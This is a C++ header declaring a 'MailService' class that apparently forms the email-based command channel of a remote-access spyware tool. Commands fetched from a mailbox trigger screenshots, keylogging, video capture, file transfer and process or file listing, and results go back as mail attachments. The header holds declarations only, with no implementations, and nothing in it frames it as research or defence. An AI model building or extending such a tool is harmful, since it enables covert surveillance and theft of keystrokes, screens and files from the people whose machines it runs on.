#pragma once
#include "curl/curl.h"
#include <fstream>
#include <queue>

#include "HandleFeature.hpp"

enum class MailCommand {
    NONE = 0,
    SCREENSHOT = 1,
    KEYLOGGER = 2,
    FILE_TRANSFER = 3,
    VIDEO = 4,
    LIST_FILES = 5,
    LIST_PROCESSES = 6,
};

struct MailAttachment {
    std::string name;
    MailCommand command;
    std::string content;
};

struct tmp {
    std::string to;
    std::string content;
};

class MailService {
    static size_t SearchCallback(void *contents, size_t size, size_t nmemb, void *userp);

    static size_t FetchCallback(void *contents, size_t size, size_t nmemb, void *userp);

    // static size_t SMTPCallback(void *contents, size_t size, size_t nmemb, void *userp);

public:
    static CURL *m_Curl;
    static std::string m_Username;
    static std::string m_Password;
    static std::string m_CertPath;
    static FileFeature *m_FileFeature;
    static KeyloggerFeature *m_KeyloggerFeature;
    static VideoFeature *m_VideoFeature;
    static WindowFeature *m_WindowFeature;
    static ProcessFeature *m_ProcessFeature;
    static std::atomic_bool m_Initialized;
    static std::atomic_bool m_isRunning;
    MailService();

    ~MailService();

    static void Init(const std::string &username, const std::string &password, const std::string &certPath);

    void Init(const std::string &confFilePath);

    static void CheckMail();

    static void CleanUpCURL();

    static void HandleMailCommand(int mailId);

    static void Response(const std::string &to, const std::string &body, MailAttachment *attachment);

    static DWORD StartMailService(LPVOID *lpParam);
};
